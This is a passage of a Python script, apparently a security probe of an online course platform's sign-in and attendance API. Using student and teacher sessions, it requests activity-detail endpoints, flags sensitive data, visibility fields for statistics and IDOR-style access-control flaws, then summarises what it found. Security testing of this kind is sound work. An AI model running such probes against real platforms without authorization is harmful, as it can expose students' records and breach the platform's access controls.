        print(f"\n--- 测试活动: {aname} (activeId={aid}) ---")

        mooc_endpoints = [
            (f"/pptSign/signedResult?activeId={aid}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={puid_s}", "signedResult"),
            (f"/pptSign/signDetail?activeId={aid}&uid={puid_s}", "signDetail"),
            (f"/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}", "v2 signIn"),
            (f"/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}", "taskactivelist"),
            (f"/newsign/getSignDetail?activeId={aid}&uid={puid_s}", "getSignDetail"),
        ]

        for endpoint, name in mooc_endpoints:
            print(f"\n  [6.x] {name}: {MOOC_BASE}{endpoint[:60]}...")
            try:
                url = f"{MOOC_BASE}{endpoint}"
                r = s_student.get(url, timeout=30)
                content_type = r.headers.get("Content-Type", "")
                print(f"    状态码: {r.status_code}, Content-Type: {content_type}")
                if "html" in content_type.lower():
                    print(f"    HTML长度: {len(r.text)}")
                    print(f"    前500字符: {trunc(r.text, 500)}")
                else:
                    data = safe_json(r)
                    resp_str = json.dumps(data, ensure_ascii=False)
                    print(f"    响应: {trunc(resp_str, 800)}")
                    flags = check_sensitive(resp_str)
                    for f in flags:
                        print(f"    {f}")
                        findings["sensitive"].append(f"mooc1-api {name}: {f}")
                    if "统计" in resp_str or "已签" in resp_str:
                        print(f"    !!!STATS!!! - 包含统计信息")
                        findings["stats"].append(f"mooc1-api {name}包含统计信息 - aid={aid}")
            except Exception as e:
                print(f"    请求失败: {e}")

    # ----------------------------------------------------------
    # Part 7: Explore "allow student view statistics" setting
    # ----------------------------------------------------------
    print_section("Part 7: 探索'允许学生查看统计'设置")

    for aid, aname in sign_activities[:3]:
        print(f"\n--- 测试活动: {aname} (activeId={aid}) ---")

        # 7.1 getActiveDetail
        print(f"\n  [7.1] /ppt/activeAPI/getActiveDetail")
        try:
            url = f"{BASE}/ppt/activeAPI/getActiveDetail"
            params = {"activeId": aid, "courseId": COURSE_ID}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            resp_str = json.dumps(data, ensure_ascii=False)
            print(f"    响应: {trunc(resp_str, 1200)}")

            # Look for view-related fields
            for field in ["isShowResult", "showResult", "allowView", "studentView",
                          "isShow", "showStat", "viewResult", "isAllowView", "allowStudentView"]:
                if field.lower() in resp_str.lower():
                    print(f"    >>> 发现字段: {field}")
                    findings["stats"].append(f"getActiveDetail包含{field}字段 - aid={aid}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 7.2 newsign/activeDetail
        print(f"\n  [7.2] /newsign/activeDetail")
        try:
            url = f"{BASE}/newsign/activeDetail"
            params = {"activeId": aid}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            resp_str = json.dumps(data, ensure_ascii=False)
            print(f"    响应: {trunc(resp_str, 1200)}")

            for field in ["isShowResult", "showResult", "allowView", "studentView",
                          "isShow", "showStat", "viewResult", "isAllowView", "allowStudentView"]:
                if field.lower() in resp_str.lower():
                    print(f"    >>> 发现字段: {field}")
                    findings["stats"].append(f"activeDetail包含{field}字段 - aid={aid}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 7.3 Teacher's view of getActiveDetail
        print(f"\n  [7.3] /ppt/activeAPI/getActiveDetail (教师)")
        try:
            url = f"{BASE}/ppt/activeAPI/getActiveDetail"
            params = {"activeId": aid, "courseId": COURSE_ID}
            r = s_teacher.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            resp_str = json.dumps(data, ensure_ascii=False)
            print(f"    响应: {trunc(resp_str, 1200)}")

            for field in ["isShowResult", "showResult", "allowView", "studentView",
                          "isShow", "showStat", "viewResult", "isAllowView", "allowStudentView"]:
                if field.lower() in resp_str.lower():
                    print(f"    >>> 发现字段: {field}")
                    findings["stats"].append(f"教师getActiveDetail包含{field}字段 - aid={aid}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 7.4 Try mooc1-api activeDetail
        print(f"\n  [7.4] mooc1-api /newsign/activeDetail")
        try:
            url = f"{MOOC_BASE}/newsign/activeDetail"
            params = {"activeId": aid}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            resp_str = json.dumps(data, ensure_ascii=False)
            print(f"    响应: {trunc(resp_str, 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 7.5 Try additional endpoints for activity config
        print(f"\n  [7.5] /newsign/getSignDetail (学生)")
        try:
            url = f"{BASE}/newsign/getSignDetail"
            params = {"activeId": aid, "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            resp_str = json.dumps(data, ensure_ascii=False)
            print(f"    响应: {trunc(resp_str, 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 7.6 Teacher's getSignDetail
        print(f"\n  [7.6] /newsign/getSignDetail (教师)")
        try:
            url = f"{BASE}/newsign/getSignDetail"
            params = {"activeId": aid, "uid": puid_t}
            r = s_teacher.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            resp_str = json.dumps(data, ensure_ascii=False)
            print(f"    响应: {trunc(resp_str, 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ----------------------------------------------------------
    # Summary
    # ----------------------------------------------------------
    print_section("综合总结")

    print("\n=== 敏感数据泄露 ===")
    if findings["sensitive"]:
        for f in set(findings["sensitive"]):
            print(f"  !!!SENSITIVE!!! {f}")
    else:
        print("  未发现敏感数据泄露")

    print("\n=== IDOR漏洞 ===")
    if findings["idor"]:
        for f in set(findings["idor"]):
            print(f"  !!!IDOR!!! {f}")
    else:
        print("  未发现IDOR漏洞")

    print("\n=== 统计数据访问 ===")
    if findings["stats"]:
        for f in set(findings["stats"]):
            print(f"  !!!STATS!!! {f}")
    else:
        print("  未发现统计数据可访问")

    print("\n=== 错误 ===")
    if findings["errors"]:
        for f in set(findings["errors"]):
            print(f"  ERROR: {f}")
    else:
        print("  无严重错误")

    print(f"\n{'='*70}")
    print("  测试完成")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()
